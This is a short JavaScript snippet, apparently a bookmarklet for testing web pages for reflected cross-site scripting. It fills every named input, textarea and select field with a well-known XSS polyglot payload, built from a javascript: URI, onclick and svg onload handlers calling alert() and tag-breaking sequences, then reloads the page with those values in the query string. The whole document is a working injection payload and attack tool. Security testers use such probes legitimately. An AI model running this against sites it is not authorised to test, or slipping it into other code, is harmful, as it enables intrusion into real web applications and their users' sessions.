(function() {
    var str = '';
    var attack = 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e';
    if (!attack) return false;

    function getallelems(v) {
        var ii = document.getElementsByTagName(v);
        for (var i = 0; i < ii.length; i++) {
            if (!ii[i].name) continue;
            str += (str ? '&' : '') + ii[i].name + '=' + attack;
        }
    }
    getallelems('input');
    getallelems('textarea');
    getallelems('select');
    str = document.location.search + (document.location.search.indexOf('?') == -1 ? '?' : '&') + str;
    document.location.search = str;
})();